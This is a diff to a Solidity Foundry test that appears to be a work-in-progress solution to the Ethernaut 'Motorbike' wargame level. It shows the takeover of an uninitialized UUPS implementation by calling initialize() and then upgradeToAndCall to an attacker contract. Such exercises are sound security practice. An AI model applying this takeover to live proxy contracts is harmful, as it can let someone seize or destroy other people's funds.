@@ -22,10 +22,29 @@ contract MotorbikeTest is DSTest {
 
         Engine engine = new Engine();
         Motorbike motorbike = new Motorbike(address(engine));
+        Engine ethernautEngine = Engine(payable(address(motorbike)));
 
-        vm.startPrank(eoaAddress);
+
+        // vm.startPrank(eoaAddress);
         
+        ethernautEngine.greetMe();
+
+        // vm.startPrank(address(engine));
+
+        engine.initialize();
+
+        BikeExy bikeExy = new BikeExy();
+
+        bytes memory initEncoded = abi.encodeWithSignature("initialize()");
+
+        emit log_address(address(engine));
+        emit log_address(address(ethernautEngine));
+
         
+
+        engine.upgradeToAndCall(address(bikeExy), initEncoded);
+
+        ethernautEngine.greetMe();
 
         //////////////////
         // LEVEL ATTACK //
@@ -39,7 +58,7 @@ contract MotorbikeTest is DSTest {
         //////////////////////
 
         // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
+        // vm.stopPrank();
         // assert(levelSuccessfullyPassed);
     }
 }
